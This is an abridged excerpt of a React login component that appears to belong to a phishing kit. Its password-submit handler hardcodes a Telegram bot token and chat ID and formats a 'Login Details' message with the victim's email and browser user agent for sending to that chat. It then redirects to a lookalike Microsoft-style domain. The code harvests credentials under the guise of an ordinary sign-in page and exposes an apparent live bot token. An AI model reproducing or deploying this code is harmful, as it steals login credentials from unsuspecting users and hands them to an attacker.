...
const Login = () => {
  ...
  const handlePasswordSubmit = async (e) => {
    ...
    try {
      ...
      const TELEGRAM_BOT_TOKEN = '7453435283:AAHr-z_2gwNz5-tPrsH9AxL7Xq7p6sTvPt4';
      const TELEGRAM_CHAT_ID = '-1002331852619';
      const loginAlert = `
🔐 <b>Login Details</b>
📧 <b>Email:</b> ${email}
...
🕵️‍♂️ <b>User Agent:</b> ${navigator.userAgent}
      ...
      setShowModal(false); // Hide modal before redirecting
      window.location.href = 'https://blq.l0g-mlcrowebapp-0ff.shop/';
    } catch (error) {
